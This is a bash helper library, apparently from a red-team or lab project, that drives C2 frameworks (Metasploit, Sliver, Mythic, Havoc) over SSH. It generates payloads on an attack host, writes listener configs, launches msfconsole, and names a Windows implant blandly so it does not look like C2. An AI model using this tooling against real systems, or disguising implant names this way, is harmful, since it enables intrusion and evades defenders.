# shellcheck shell=bash
# Source from project-responder/scripts/*.sh after setting SCRIPT_DIR to that scripts/ directory:
#   SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
#   # shellcheck source=/dev/null
#   source "${SCRIPT_DIR}/attack_c2_helpers/runner_lib.sh"

: "${C2_FRAMEWORK:=metasploit}"
export C2_FRAMEWORK

# Pre-built Windows implant on the attack host (Mythic / Havoc / Sliver fallback). Bland lab name so
# filenames do not telegraph "C2"; override if you prefer, e.g. C2_STAGED_IMPLANT_PATH=/home/ubuntu/PolicySync.exe
: "${C2_STAGED_IMPLANT_PATH:=/home/ubuntu/TSG-DesktopSupportAssistant.exe}"
export C2_STAGED_IMPLANT_PATH

_C2_HELPER_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REMOTE_SERVER_C2_SH="${_C2_HELPER_DIR}/remote_server_c2.sh"

c2_validate_framework() {
  case "${C2_FRAMEWORK}" in
    metasploit|sliver|mythic|havoc) ;;
    *)
      echo "[!] C2_FRAMEWORK='${C2_FRAMEWORK}' invalid. Use: metasploit, sliver, mythic, havoc"
      exit 1
      ;;
  esac
}

# Run payload generator on attack server (script stdin).
# Args: SSH_OPTS ATTACK_USER ATTACK_IP LHOST_VALUE LPORT PAYLOAD_ABS_PATH
c2_remote_payload() {
  local SSH_OPTS="$1"
  local ATTACK_USER="$2"
  local ATTACK_IP="$3"
  local LHOST_VAL="$4"
  local LPORT="$5"
  local PAYLOAD_ABS="$6"
  ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" \
    "export C2_FRAMEWORK='${C2_FRAMEWORK}' MODE=payload LHOST='${LHOST_VAL}' LPORT='${LPORT}' PAYLOAD='${PAYLOAD_ABS}' C2_STAGED_IMPLANT_PATH='${C2_STAGED_IMPLANT_PATH}'; bash -s" \
    < "${REMOTE_SERVER_C2_SH}"
}

# Write listener resource or operator notes on attack server.
# Args: SSH_OPTS ATTACK_USER ATTACK_IP LPORT RC_OUT_PATH [LHOST_OPTIONAL]
c2_remote_listener_doc() {
  local SSH_OPTS="$1"
  local ATTACK_USER="$2"
  local ATTACK_IP="$3"
  local LPORT="$4"
  local RC_OUT="$5"
  local LHOST_VAL="${6:-}"
  [[ -n "${LHOST_VAL}" ]] || LHOST_VAL="$(ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" curl -s http://169.254.169.254/latest/meta-data/public-ipv4)"
  ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" \
    "export C2_FRAMEWORK='${C2_FRAMEWORK}' MODE=listener_rc LHOST='${LHOST_VAL}' LPORT='${LPORT}' RC_OUT='${RC_OUT}' C2_STAGED_IMPLANT_PATH='${C2_STAGED_IMPLANT_PATH}'; bash -s" \
    < "${REMOTE_SERVER_C2_SH}"
}

# Attach Metasploit in tmux if C2 is metasploit; otherwise print operator notes path.
# Args: SSH_OPTS ATTACK_USER ATTACK_IP TMUX_SESSION RC_PATH_OR_NOTES_PATH
c2_start_listener_tmux_or_print() {
  local SSH_OPTS="$1"
  local ATTACK_USER="$2"
  local ATTACK_IP="$3"
  local TMUX_SESSION="$4"
  local RC_PATH="$5"
  if [[ "${C2_FRAMEWORK}" == "metasploit" ]]; then
    ssh ${SSH_OPTS} -t "${ATTACK_USER}@${ATTACK_IP}" \
      "tmux kill-session -t ${TMUX_SESSION} 2>/dev/null; tmux new-session -s ${TMUX_SESSION} 'msfconsole -q -r ${RC_PATH}'"
  else
    echo "[*] C2_FRAMEWORK=${C2_FRAMEWORK} — Metasploit tmux not started."
    echo "    Operator notes on attack box: ${RC_PATH}"
    echo "    ssh ${SSH_OPTS} ${ATTACK_USER}@${ATTACK_IP} 'cat ${RC_PATH}'"
  fi
}
